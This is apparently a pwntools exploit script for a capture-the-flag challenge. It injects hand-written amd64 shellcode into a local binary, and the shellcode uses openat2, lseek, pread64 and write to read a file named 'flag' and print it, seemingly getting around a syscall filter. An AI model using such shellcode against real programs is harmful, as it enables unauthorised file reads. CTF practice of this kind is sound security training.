#!/usr/bin/python3
from pwn import process, asm

shell = process("./bin")

shellcode = asm("""
    xor rdi, rdi      # $rdi = 0x0
    push 0x67616c66   # $rsp = "flag"
    mov rsi, rsp      # $rsi = "flag"
    push rdi          # NULL
    push rdi          # NULL
    push rdi          # NULL
    sub rdi, 0x64     # space for data
    push rsp          # structure
    pop rdx           # $rdx = structure
    push 0x18         # len
    pop r10           # $r10 = len
    push 0x1b5        # openat2()
    pop rax           # $rax = openat2()
    syscall           # syscall()

    xchg rax, rdi     # $rdi = descriptor
    push 0x2          # whence
    pop rdx           # $rdx = whence
    xor rsi, rsi      # $rsi = offset
    push 0x8          # lseek()
    pop rax           # $rax = lseek()
    syscall           # syscall

    push rsp          # stack
    pop rsi           # $rsi = buffer
    xchg rdx, rax     # $rdx = len
    xor r10, r10      # $r10 = offset
    push 0x11         # pread64()
    pop rax           # $rax = pread64()
    syscall           # syscall

    push 0x2          # descriptor
    pop rdi           # $rdi = descriptor
    push 0x1          # write()
    pop rax           # $rax = write()
    syscall           # syscall()
""", arch="amd64")

shell.sendlineafter(b".\n", shellcode)
shell.interactive()
